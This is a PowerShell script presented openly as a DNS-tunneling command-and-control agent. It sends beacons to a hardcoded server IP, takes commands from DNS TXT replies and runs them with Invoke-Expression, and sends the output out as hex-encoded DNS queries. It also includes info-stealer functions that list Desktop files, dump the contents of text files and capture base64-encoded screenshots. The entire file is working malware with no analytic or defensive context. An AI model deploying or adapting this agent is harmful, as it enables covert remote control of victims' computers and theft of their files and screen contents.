# ====================================================================

# template_dns.ps1 - Interactive DNS Tunneling Agent (TXT/A Channels)

# ====================================================================

$C2Server = "134.199.229.158" 
$BaseDomain = "e0.local"

# creating a unique agent name for session identification
$AgentName = "DNS_Agent_" + (Get-Random -Minimum 1000 -Maximum 9999)

function Send-LootInChunks ([string]$Payload) {

    if ([string]::IsNullOrEmpty($Payload)) { return }
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
    $TotalBytes = $Bytes.Length
    $InitDomain = "s$($TotalBytes).i.e0.local"
    $Discard = Resolve-DnsName -Name $InitDomain -Type A -Server $C2Server -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 200
    $ChunkSize = 30
    $Seq = 1

    for ($i = 0; $i -lt $TotalBytes; $i += $ChunkSize) {
        $Size = [Math]::Min($ChunkSize, $TotalBytes - $i)
        $SubBytes = New-Object Byte[] $Size
        [Array]::Copy($Bytes, $i, $SubBytes, 0, $Size)
        $HexStr = ($SubBytes | ForEach-Object { $_.ToString("X2") }) -join ""
        $EndFlag = 0
        if (($i + $ChunkSize) -ge $TotalBytes) { $EndFlag = 1 }
        $DataDomain = "d$($HexStr).q$($Seq).m$($EndFlag).$BaseDomain"
        $Discard = Resolve-DnsName -Name $DataDomain -Type A -Server $C2Server -ErrorAction SilentlyContinue
        $Seq++
        Start-Sleep -Milliseconds 150  
    }
}

Send-LootInChunks -Payload "[+] Hello Operator! New DNS Tunnel active. Name: $AgentName"

# INFO STEALER: Full Desktop File Enumeration & Content Extraction
function Invoke-DesktopFileStealer {
    $DesktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
    
    $AllFiles = Get-ChildItem -Path $DesktopPath -File -ErrorAction SilentlyContinue
    
    if ($AllFiles) {
        $Report = "[⚡] INFO STEALER - DESKTOP MAP & SYSTEM EVIDENCE:`n"
        $Report += "==================================================`n"
        $Report += "Total Files Found: $($AllFiles.Count)`n`n"
        
        foreach ($File in $AllFiles) {
            $Report += "[+] FILE NAME: $($File.Name)`n"
            $Report += "[+] SIZE     : $($File.Length) Bytes`n"
            $Report += "[+] EXTENSION: $($File.Extension)`n"
            
            if ($File.Extension -eq ".txt") {
                $Content = Get-Content -Path $File.FullName -Raw -ErrorAction SilentlyContinue
                if (-not [string]::IsNullOrWhiteSpace($Content)) {
                    $Report += "[+] CONTENT  :`n$Content`n"
                } else {
                    $Report += "[+] CONTENT  : (Empty File)`n"
                }
            }
            $Report += "--------------------------------------------------`n"
        }
        return $Report
    } else {
        return "[-] Info Stealer: Desktop is completely empty."
    }
}

# INFO STEALER: Live Desktop Screenshot Capture (Base64 Streamer)
function Invoke-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        
        $Graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size)
        
        $MemoryStream = New-Object System.IO.MemoryStream
        $Bitmap.Save($MemoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $Bytes = $MemoryStream.ToArray()
        $Base64String = [Convert]::ToBase64String($Bytes)
        
        $Graphics.Dispose()
        $Bitmap.Dispose()
        $MemoryStream.Dispose()
        
        return "[📊] SCREENSHOT_DATA:$Base64String"
    } catch {
        return "[-] Error capturing screenshot: $_"
    }
}

while ($true) {
    try {
        $DnsQuery = Resolve-DnsName -Name "beacon.e0.local" -Type TXT -Server $C2Server -ErrorAction SilentlyContinue
        if ($DnsQuery -and $DnsQuery.Strings) {
            $Command = $DnsQuery.Strings[0]
            if (-not [string]::IsNullOrWhiteSpace($Command) -and $Command -ne "1.2.3.4") {
                $Result = ""
                try {
                    $RawResult = Invoke-Expression $Command | Out-String
                    $Result = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($RawResult))
                    if ([string]::IsNullOrWhiteSpace($Result)) {
                        $Result = "[+] Command executed successfully (No output)."
                    }
                } catch {
                    $Result = "Error executing command over DNS: $_"
                }
                Send-LootInChunks -Payload $Result
            }
        }
    } catch {

    }

    Start-Sleep -Seconds 5
}
